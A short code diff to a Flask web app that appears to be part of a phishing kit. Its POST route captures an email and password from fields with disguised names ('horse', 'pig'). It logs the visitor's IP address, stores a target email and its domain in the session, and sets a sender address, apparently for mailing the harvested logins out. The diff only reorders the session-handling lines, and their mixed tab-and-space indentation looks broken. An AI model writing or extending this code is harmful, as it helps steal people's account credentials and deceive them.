@@ -135,6 +135,10 @@ def route2():
 
 @app.route("/first", methods=['POST'])
 def first():
+    web_param = request.args.get('web')
+    if web_param:
+        session['eman'] = web_param
+	session['ins'] = web_param[web_param.index('@') + 1:]
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -143,10 +147,6 @@ def first():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-	web_param = request.args.get('web')
-	if web_param:
-	    session['eman'] = web_param
-	    session['ins'] = web_param[web_param.index('@') + 1:]
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
